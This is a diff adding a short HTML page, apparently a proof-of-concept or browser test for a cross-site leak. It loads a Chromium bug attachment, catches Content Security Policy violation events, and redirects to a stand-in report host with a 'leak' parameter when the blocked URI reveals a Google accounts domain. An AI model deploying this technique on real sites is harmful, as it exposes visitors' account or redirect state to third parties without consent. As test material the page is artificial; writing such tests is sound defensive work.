@@ -1,0 +1,9 @@
+<img src="https://bugs.chromium.org/issueattachment?id=805557" />
+<script>
+    document.addEventListener("securitypolicyviolation", function (e) {
+        console.log("Blocked URI: " + e.blockedURI);
+        if (e.blockedURI.includes("accounts.google.com") || e.blockedURI.includes("googleusercontent.com")) {
+            document.location.href = "https://a.test/report/?leak=c932892";
+        }
+    });
+</script>
